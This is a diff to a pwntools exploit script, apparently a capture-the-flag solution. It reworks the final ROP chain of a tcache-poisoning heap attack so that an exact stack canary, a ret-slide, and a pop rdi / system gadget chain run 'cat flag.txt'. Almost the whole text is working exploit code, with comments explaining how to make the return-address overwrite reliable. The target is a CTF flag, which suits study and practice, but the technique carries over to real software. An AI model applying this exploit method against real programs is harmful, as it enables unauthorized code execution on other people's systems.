@@ -196,22 +196,32 @@ def main():
     add(0xe8, b"dummy\n")       # returns C1, tcache head = stack_target
 
     # ---- 5. ROP chain written by the final add() ----
+    # The write lands in the cramped add()/read_with_null frame overlap, so exact
+    # placement of the return slot is fragile. Use a long `ret`-slide: as long as
+    # add()'s return (saved_rip) lands anywhere in the slide, execution slides
+    # down to pop_rdi; system("cat flag.txt"). The canary must still be exact.
     rop     = ROP(libc)
     ret     = rop.find_gadget(["ret"])[0]
     pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
     system  = libc.sym["system"]
-    cmd_addr = saved_rip + 0x20                # where "cat flag.txt" lands
 
-    data = bytearray(b"X" * 0xe8)
+    SLIDE_START = OFF - 0x10      # data offset that maps to saved_rip
+    TAIL        = 0xb0           # where the real chain (pop rdi; system) begins
+    STR_OFF     = TAIL + 0x18
+    data_addr   = stack_target + 0x10
+    cmd_addr    = data_addr + STR_OFF
+
+    data = bytearray()
+    data += p64(ret) * (0xe8 // 8)          # baseline ret-slide everywhere
+    data = data[:0xe8]
     def put(off, v): data[off:off + 8] = p64(v)
-    # data buffer starts at stack_target+0x10 == saved_rip-0x28
-    put(OFF - 0x20, canary)      # -> saved_rip-0x10  (add()'s canary)
-    put(OFF - 0x18, saved_rbp)   # -> saved_rip-0x08
-    put(OFF - 0x10, ret)         # -> saved_rip       (add()'s return)
-    put(OFF - 0x08, pop_rdi)
-    put(OFF,        cmd_addr)
-    put(OFF + 0x08, system)
-    data[OFF + 0x10:OFF + 0x10 + 13] = b"cat flag.txt\x00"
+    put(OFF - 0x20, canary)                 # -> saved_rip-0x10 (add()'s canary, exact)
+    put(OFF - 0x18, saved_rbp)              # -> saved_rip-0x08
+    # SLIDE_START .. TAIL already full of `ret`
+    put(TAIL,        pop_rdi)
+    put(TAIL + 0x08, cmd_addr)
+    put(TAIL + 0x10, system)
+    data[STR_OFF:STR_OFF + 13] = b"cat flag.txt\x00"
 
     log.success("sending final ROP chain")
     choose("Add a node"); io.recvuntil(b"Size?"); io.sendline(str(0xe8).encode())
